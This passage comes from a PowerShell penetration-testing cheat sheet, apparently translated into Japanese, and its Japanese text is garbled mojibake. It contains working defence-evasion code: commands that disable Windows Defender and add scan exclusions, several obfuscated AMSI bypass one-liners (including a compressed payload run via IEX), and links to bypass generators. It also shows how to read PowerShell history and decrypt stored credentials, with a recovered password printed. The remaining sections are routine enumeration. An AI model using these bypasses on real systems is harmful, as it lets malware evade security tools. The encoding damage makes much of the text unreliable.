New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSIãƒã‚¤ãƒ‘ã‚¹

**`amsi.dll`**ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒç›¸äº’ä½œç”¨ã™ã‚‹ãŸã‚ã«å¿…è¦ãª**ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ**ã‚’æŒã¡ã€ãƒ—ãƒ­ã‚»ã‚¹ã«**ãƒ­ãƒ¼ãƒ‰**ã•ã‚Œã¾ã™ã€‚ãã—ã¦ã€ãã‚ŒãŒãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ¡ãƒ¢ãƒªç©ºé–“ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ãƒ¡ãƒ¢ãƒªå†…ã®å‘½ä»¤ã‚’**ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§å‹•ä½œã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ä½•ã‚‚æ¤œå‡ºã—ãªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€AMSIãƒã‚¤ãƒ‘ã‚¹ã®ç›®çš„ã¯ã€**ãã®DLLã®å‘½ä»¤ã‚’ãƒ¡ãƒ¢ãƒªå†…ã§ä¸Šæ›¸ãã—ã¦æ¤œå‡ºã‚’ç„¡åŠ¹åŒ–ã™ã‚‹**ã“ã¨ã§ã™ã€‚

**AMSIãƒã‚¤ãƒ‘ã‚¹ã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼**ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸: [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSIãƒã‚¤ãƒ‘ã‚¹2 - ãƒãƒãƒ¼ã‚¸ãƒ‰APIå‘¼ã³å‡ºã—ãƒ•ãƒƒã‚¯

è©³ç´°ãªæƒ…å ±ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿ã‚’å‚ç…§ã—ã¦ãã ã•ã„**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/) **ãŠã‚ˆã³ã‚³ãƒ¼ãƒ‰**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)ã€‚

ã“ã®æ–°ã—ã„æŠ€è¡“ã¯ã€.NETãƒ¡ã‚½ãƒƒãƒ‰ã®APIå‘¼ã³å‡ºã—ãƒ•ãƒƒã‚¯ã«ä¾å­˜ã—ã¦ã„ã¾ã™ã€‚å®Ÿéš›ã€.NETãƒ¡ã‚½ãƒƒãƒ‰ã¯ãƒ¡ãƒ¢ãƒªå†…ã§ãƒã‚¤ãƒ†ã‚£ãƒ–ãªãƒã‚·ãƒ³å‘½ä»¤ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã€ãƒã‚¤ãƒ†ã‚£ãƒ–ãªãƒ¡ã‚½ãƒƒãƒ‰ã¨éå¸¸ã«ä¼¼ãŸå½¢ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®åˆ¶å¾¡ãƒ•ãƒ­ãƒ¼ã‚’å¤‰æ›´ã™ã‚‹ãŸã‚ã«ãƒ•ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

.NETãƒ¡ã‚½ãƒƒãƒ‰ã®APIå‘¼ã³å‡ºã—ãƒ•ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹æ‰‹é †ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

1. ãƒ•ãƒƒã‚¯ã™ã‚‹å¯¾è±¡ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ç‰¹å®šã™ã‚‹
2. ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¨åŒã˜é–¢æ•°ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’æŒã¤ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®šç¾©ã™ã‚‹
3. ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ãƒªãƒ•ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹
4. å„ãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹
5. å„ãƒ¡ã‚½ãƒƒãƒ‰ã®ãƒ¡ãƒ¢ãƒªä¸Šã®ä½ç½®ã‚’è¦‹ã¤ã‘ã‚‹
6. æ‚ªæ„ã®ã‚ã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒ‡ã™å‘½ä»¤ã«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹

## PS-History
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## æ¨©é™ã®å–å¾—

To get the permissions of a file or directory in PowerShell, you can use the `Get-Acl` cmdlet. This cmdlet retrieves the access control list (ACL) for the specified object.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions associated with the file.txt file, including the user or group, the access level (e.g., Read, Write, Execute), and any special permissions.

You can also use the `Get-Acl` cmdlet with the `Format-List` cmdlet to display the permissions in a more detailed format.

```powershell
Get-Acl -Path C:\path\to\file.txt | Format-List
```

This command will provide additional information, such as the owner of the file, the access control entries (ACEs), and the inheritance settings.

By understanding the permissions assigned to a file or directory, you can assess the level of access and potential vulnerabilities that may exist. This information can be valuable during a penetration test or security assessment.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## OSã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨HotFixes

Windowsã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨é©ç”¨ã•ã‚Œã¦ã„ã‚‹HotFixesï¼ˆãƒ›ãƒƒãƒˆãƒ•ã‚£ãƒƒã‚¯ã‚¹ï¼‰ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, CSDVersion, OSArchitecture, Version, BuildNumber
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€Windowsã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã€Service Packã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã€OSã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã€ãƒ“ãƒ«ãƒ‰ç•ªå·ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

ã¾ãŸã€HotFixesï¼ˆãƒ›ãƒƒãƒˆãƒ•ã‚£ãƒƒã‚¯ã‚¹ï¼‰ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-HotFix
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€é©ç”¨ã•ã‚Œã¦ã„ã‚‹HotFixesï¼ˆãƒ›ãƒƒãƒˆãƒ•ã‚£ãƒƒã‚¯ã‚¹ï¼‰ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## ç’°å¢ƒ

The following tools and configurations are recommended for executing the PowerShell commands and scripts mentioned in this guide:

ã“ã®ã‚¬ã‚¤ãƒ‰ã§è¨€åŠã•ã‚Œã¦ã„ã‚‹PowerShellã®ã‚³ãƒãƒ³ãƒ‰ã¨ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ãƒ„ãƒ¼ãƒ«ã¨è¨­å®šãŒæ¨å¥¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

- Windows operating system (preferably Windows 10 or later)
- PowerShell version 5.1 or later
- Administrative privileges (for certain commands)
- Internet access (for downloading additional modules or scripts)

- Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ï¼ˆå¯èƒ½ãªã‚‰Windows 10ä»¥é™ï¼‰
- PowerShellãƒãƒ¼ã‚¸ãƒ§ãƒ³5.1ä»¥é™
- ç®¡ç†è€…ç‰¹æ¨©ï¼ˆä¸€éƒ¨ã®ã‚³ãƒãƒ³ãƒ‰ã«å¿…è¦ï¼‰
- ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‚¢ã‚¯ã‚»ã‚¹ï¼ˆè¿½åŠ ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚„ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã«å¿…è¦ï¼‰

## Execution Policy

Before running any PowerShell scripts, it is important to check and set the execution policy. The execution policy determines whether PowerShell scripts can be run on a system. To check the current execution policy, open a PowerShell session and run the following command:

```powershell
Get-ExecutionPolicy
```

To set the execution policy to allow running scripts, run the following command with administrative privileges:

```powershell
Set-ExecutionPolicy RemoteSigned
```

ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹å‰ã«ã€å®Ÿè¡Œãƒãƒªã‚·ãƒ¼ã‚’ç¢ºèªã—ã¦è¨­å®šã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚å®Ÿè¡Œãƒãƒªã‚·ãƒ¼ã¯ã€PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒã‚·ã‚¹ãƒ†ãƒ ä¸Šã§å®Ÿè¡Œã§ãã‚‹ã‹ã©ã†ã‹ã‚’æ±ºå®šã—ã¾ã™ã€‚ç¾åœ¨ã®å®Ÿè¡Œãƒãƒªã‚·ãƒ¼ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€PowerShellã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹ãã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```powershell
Get-ExecutionPolicy
```

ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’è¨±å¯ã™ã‚‹ãŸã‚ã«ã€ç®¡ç†è€…ç‰¹æ¨©ã§æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```powershell
Set-ExecutionPolicy RemoteSigned
```

## PowerShell Profiles

PowerShell profiles allow you to customize and configure your PowerShell environment. There are different types of profiles that are loaded automatically when PowerShell starts. To view the profiles, run the following command:

```powershell
$PROFILE | Format-List * -Force
```

To create or edit a profile, you can use the following commands:

```powershell
notepad $PROFILE
```

```powershell
ise $PROFILE
```

PowerShellãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€PowerShellç’°å¢ƒã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºãŠã‚ˆã³è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚PowerShellãŒèµ·å‹•ã™ã‚‹ã¨è‡ªå‹•çš„ã«èª­ã¿è¾¼ã¾ã‚Œã‚‹ç•°ãªã‚‹ã‚¿ã‚¤ãƒ—ã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™ã€‚ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```powershell
$PROFILE | Format-List * -Force
```

ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã¾ãŸã¯ç·¨é›†ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

```powershell
notepad $PROFILE
```

```powershell
ise $PROFILE
```
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## ä»–ã®æ¥ç¶šã•ã‚ŒãŸãƒ‰ãƒ©ã‚¤ãƒ–

In this section, we will discuss how to identify and access other connected drives using PowerShell.

ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€PowerShellã‚’ä½¿ç”¨ã—ã¦ä»–ã®æ¥ç¶šã•ã‚ŒãŸãƒ‰ãƒ©ã‚¤ãƒ–ã‚’ç‰¹å®šã—ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚

### List all drives

### ã™ã¹ã¦ã®ãƒ‰ãƒ©ã‚¤ãƒ–ã‚’ãƒªã‚¹ãƒˆã™ã‚‹

To list all the drives connected to the system, you can use the `Get-PSDrive` cmdlet.

ã‚·ã‚¹ãƒ†ãƒ ã«æ¥ç¶šã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒ‰ãƒ©ã‚¤ãƒ–ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã«ã¯ã€`Get-PSDrive`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-PSDrive
```

This command will display a list of all the drives along with their names, types, and root paths.

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã™ã¹ã¦ã®ãƒ‰ãƒ©ã‚¤ãƒ–ã®åå‰ã€ã‚¿ã‚¤ãƒ—ã€ãŠã‚ˆã³ãƒ«ãƒ¼ãƒˆãƒ‘ã‚¹ã‚’å«ã‚€ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

### Accessing a specific drive

### ç‰¹å®šã®ãƒ‰ãƒ©ã‚¤ãƒ–ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

To access a specific drive, you can use the drive letter followed by a colon (`:`) as the path.

ç‰¹å®šã®ãƒ‰ãƒ©ã‚¤ãƒ–ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€ãƒ‰ãƒ©ã‚¤ãƒ–ãƒ¬ã‚¿ãƒ¼ã«ç¶šã‘ã¦ã‚³ãƒ­ãƒ³ï¼ˆ`:`ï¼‰ã‚’ãƒ‘ã‚¹ã¨ã—ã¦ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
cd D:
```

This command will change the current location to the root of the D drive.

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ç¾åœ¨ã®å ´æ‰€ã‚’Dãƒ‰ãƒ©ã‚¤ãƒ–ã®ãƒ«ãƒ¼ãƒˆã«å¤‰æ›´ã—ã¾ã™ã€‚

### Accessing a network drive

### ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‰ãƒ©ã‚¤ãƒ–ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

To access a network drive, you can use the UNC path (`\\server\share`) as the path.

ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‰ãƒ©ã‚¤ãƒ–ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€UNCãƒ‘ã‚¹ï¼ˆ`\\server\share`ï¼‰ã‚’ãƒ‘ã‚¹ã¨ã—ã¦ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
cd \\server\share
```

This command will change the current location to the root of the network drive.

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ç¾åœ¨ã®å ´æ‰€ã‚’ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‰ãƒ©ã‚¤ãƒ–ã®ãƒ«ãƒ¼ãƒˆã«å¤‰æ›´ã—ã¾ã™ã€‚

### Conclusion

### çµè«–

By using PowerShell, you can easily list and access other connected drives on a Windows system. This can be useful for navigating through different drives and performing various operations.

PowerShellã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€Windowsã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ä»–ã®æ¥ç¶šã•ã‚ŒãŸãƒ‰ãƒ©ã‚¤ãƒ–ã‚’ç°¡å˜ã«ãƒªã‚¹ãƒˆã—ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ç•°ãªã‚‹ãƒ‰ãƒ©ã‚¤ãƒ–ã‚’ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã—ã€ã•ã¾ã–ã¾ãªæ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### ãƒªã‚µã‚¤ã‚¯ãƒ« ãƒ“ãƒ³

The Recycle Bin is a special folder in Windows that stores deleted files and folders. When a file or folder is deleted, it is not immediately removed from the system. Instead, it is moved to the Recycle Bin, where it can be restored if needed.

The Recycle Bin provides a safety net for users, allowing them to recover accidentally deleted files. It is especially useful in cases where important files are deleted by mistake or when files are deleted and later found to be needed again.

To access the Recycle Bin, simply double-click on its icon on the desktop. This will open a window displaying all the files and folders that have been deleted. From here, you can select the files or folders you want to restore and click on the "Restore" button to move them back to their original location.

It is important to note that the Recycle Bin has a limited storage capacity. Once it reaches its maximum size, older files will be automatically deleted to make room for new ones. Therefore, it is recommended to regularly empty the Recycle Bin to free up disk space.

In summary, the Recycle Bin is a useful feature in Windows that allows users to recover deleted files and folders. It serves as a safety net, providing a second chance to retrieve important data that was accidentally deleted.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## ãƒ‰ãƒ¡ã‚¤ãƒ³ã®åµå¯Ÿ

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## ãƒ¦ãƒ¼ã‚¶ãƒ¼
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰å¹³æ–‡ã¸

Sometimes during a penetration test, you may come across a secure string that needs to be converted to plaintext for further analysis. In PowerShell, you can use the `ConvertFrom-SecureString` cmdlet to achieve this.

ä»¥ä¸‹ã®ã‚ˆã†ã«ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆä¸­ã«ã€ã•ã‚‰ãªã‚‹åˆ†æã®ãŸã‚ã«ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’å¹³æ–‡ã«å¤‰æ›ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚PowerShellã§ã¯ã€`ConvertFrom-SecureString`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

In the above example, we first create a secure string using the `ConvertTo-SecureString` cmdlet. We pass the desired plaintext password as a parameter and use the `-AsPlainText` and `-Force` flags to ensure the conversion. 

ä¸Šè¨˜ã®ä¾‹ã§ã¯ã€ã¾ãš`ConvertTo-SecureString`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’ä½œæˆã—ã¾ã™ã€‚ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦æœ›ã‚€å¹³æ–‡ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¸¡ã—ã€å¤‰æ›ã‚’ç¢ºå®Ÿã«ã™ã‚‹ãŸã‚ã«`-AsPlainText`ã¨`-Force`ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

Next, we use the `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR()` method to convert the secure string to a BSTR (Basic String) representation. Finally, we use the `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto()` method to convert the BSTR representation to plaintext.

æ¬¡ã«ã€`[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR()`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’BSTRï¼ˆBasic Stringï¼‰è¡¨ç¾ã«å¤‰æ›ã—ã¾ã™ã€‚æœ€å¾Œã«ã€`[System.Runtime.InteropServices.Marshal]::PtrToStringAuto()`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€BSTRè¡¨ç¾ã‚’å¹³æ–‡ã«å¤‰æ›ã—ã¾ã™ã€‚

Keep in mind that this method should only be used for legitimate purposes and with proper authorization.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
ã¾ãŸã¯ã€XMLã‹ã‚‰ç›´æ¥è§£æã™ã‚‹æ–¹æ³•ã‚‚ã‚ã‚Šã¾ã™ã€‚
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDOã¯ã€Linuxã‚·ã‚¹ãƒ†ãƒ ã§ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚é€šå¸¸ã€rootãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’æŒãŸãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç‰¹å®šã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

